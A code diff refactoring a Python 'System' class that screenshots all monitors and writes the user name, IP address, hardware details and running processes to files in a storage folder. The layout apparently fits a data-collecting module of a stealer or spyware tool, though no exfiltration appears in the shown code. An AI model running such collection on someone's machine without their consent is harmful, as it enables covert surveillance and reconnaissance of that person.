@@ -9,61 +9,67 @@ from socket import gethostbyname, gethostname
 
 class System:
 
-    def __init__(self, storage_path: str, storage_folder: str, folder: str, errors: bool):
+    def __init__(self, *args):
 
-        self.storage_path = storage_path
-        self.storage_folder = storage_folder
-        self.folder = folder
-        self.errors = errors
+        self.storage_path = args[0]
+        self.storage_folder = args[1]
+        self.folder = args[2]
+
+        self.statuses = args[3]
+        self.errors = args[4]
 
     def __create_folder(self):
 
-        mkdir(f"{self.storage_path}{self.storage_folder}{self.folder}")
+        if any(self.statuses):
+            mkdir(f"{self.storage_path}{self.storage_folder}{self.folder}")
 
     def __create_screen(self):
 
-        with mss() as screen:
-            screen.shot(mon=-1, output=f"{self.storage_path}{self.storage_folder}{self.folder}/Screenshot.png")
+        if self.statuses[0] is True:
+            with mss() as screen:
+                screen.shot(mon=-1, output=f"{self.storage_path}{self.storage_folder}{self.folder}/Screenshot.png")
 
     def __get_system_info(self):
 
-        computer = WMI()
+        if self.statuses[1] is True:
 
-        os_info = computer.Win32_OperatingSystem()[0]
-        cpu_info = computer.Win32_Processor()[0]
-        gpu_info = computer.Win32_VideoController()[0]
+            computer = WMI()
 
-        info = [
-            f"User: {getuser()}\n",
-            f"IP: {gethostbyname(gethostname())}\n",
-            f"OS Name: {os_info.Name.split('|')[0]}\n",
-            f"OS Version: {' '.join([os_info.Version, os_info.BuildNumber])}\n",
-            f"CPU: {cpu_info.Name}\n",
-            f"GPU: {gpu_info.Name}\n",
-            f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
-        ]
+            os_info = computer.Win32_OperatingSystem()[0]
+            cpu_info = computer.Win32_Processor()[0]
+            gpu_info = computer.Win32_VideoController()[0]
 
-        with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as system:
+            info = [
+                f"User: {getuser()}\n",
+                f"IP: {gethostbyname(gethostname())}\n",
+                f"OS Name: {os_info.Name.split('|')[0]}\n",
+                f"OS Version: {' '.join([os_info.Version, os_info.BuildNumber])}\n",
+                f"CPU: {cpu_info.Name}\n",
+                f"GPU: {gpu_info.Name}\n",
+                f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
+            ]
 
-            system.write(f"[System info]\n")
+            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as system:
 
-            for item in info:
+                system.write(f"[System info]\n")
 
-                system.write(item)
+                for item in info:
+                    system.write(item)
 
-        system.close()
+            system.close()
 
     def __get_system_processes(self):
 
-        with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as processes:
+        if self.statuses[2] is True:
 
-            processes.write(f"\n[Startup time] [Status] [CPU %] [RAM %] [Name]")
+            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as processes:
 
-            for process in process_iter():
+                processes.write(f"\n[Startup time] [Status] [CPU %] [RAM %] [Name]")
 
-                processes.write(f"\n[{datetime.fromtimestamp(process.create_time())}] [{process.status()}] [{process.cpu_percent()}] [{process.memory_percent():.4f}] {process.name()}")
+                for process in process_iter():
+                    processes.write(f"\n[{datetime.fromtimestamp(process.create_time())}] [{process.status()}] [{process.cpu_percent()}] [{process.memory_percent():.4f}] {process.name()}")
 
-        processes.close()
+            processes.close()
 
     def run(self):
 
@@ -77,9 +83,4 @@ class System:
         except Exception as e:
 
             if self.errors is True:
-
                 print(f"[SYSTEM]: {repr(e)}")
-
-            else:
-
-                pass
